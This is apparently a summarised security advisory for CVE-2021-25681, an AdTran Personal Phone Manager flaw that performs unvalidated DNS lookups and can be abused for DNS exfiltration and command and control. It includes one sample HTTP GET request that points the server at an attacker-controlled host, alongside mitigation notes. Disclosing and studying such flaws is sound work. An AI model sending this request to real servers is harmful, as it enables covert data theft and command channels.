Based on the provided content, here's a breakdown of the vulnerability information related to CVE-2021-25681:

**Root Cause of Vulnerability:**
The AdTran Personal Phone Manager software performs arbitrary DNS lookups based on user-controlled input in the HTTP Host header and GET request, without proper validation or scoping.

**Weaknesses/Vulnerabilities Present:**
- **Unvalidated DNS Lookups:** The software makes DNS requests based on the host specified in the HTTP request without validating if this is an expected or allowed destination.
- **Data Exfiltration:** By directing DNS lookups to an attacker-controlled DNS server, arbitrary data can be tunneled through DNS queries.
- **DNS Redirector:** The exposed AdTran Personal Phone Manager web server can be abused as a DNS redirector, enabling command and control (C2) or other malicious activities.

**Impact of Exploitation:**
- **DNS Based Command and Control:** Attackers can use the vulnerable server as a redirector to establish C2 channels over DNS.
- **Arbitrary Data Exfiltration:** Attackers can exfiltrate sensitive data by tunneling it through DNS queries directed to an attacker-controlled server.

**Attack Vectors:**
- **HTTP GET Request:**  A simple HTTP GET request to the vulnerable server, including an attacker-controlled DNS target in the URL.
   ```
   GET http://mydns.attack.com/ HTTP/1.1
   Host: SOME ADTRAN HOST HERE
   Pragma: no-cache
   Cache-Control: no-cache, no-transform
   Connection: close
   ```

**Required Attacker Capabilities/Position:**
- **Network Access:** The attacker needs network access to an exposed AdTran Personal Phone Manager web server.
- **Ability to Send HTTP Request:** The attacker needs to be able to send a crafted HTTP GET request to the vulnerable server.
- **Attacker-Controlled DNS Server:** The attacker needs a DNS server under their control to receive the exfiltrated data.

**Additional Information:**
- The vulnerability was verified on AdTran Personal Phone Manager v10.8.1.
- Affected appliances (NetVanta 7060 and NetVanta 7100) are considered End of Life (EOL) and will not be patched.
- Mitigation involves reconfiguring the server to not perform arbitrary DNS lookups when the Host/Get requests do not match and to scope requests only within the applicationâ€™s context.
- The timeline of discovery, notification, and disclosure is included.
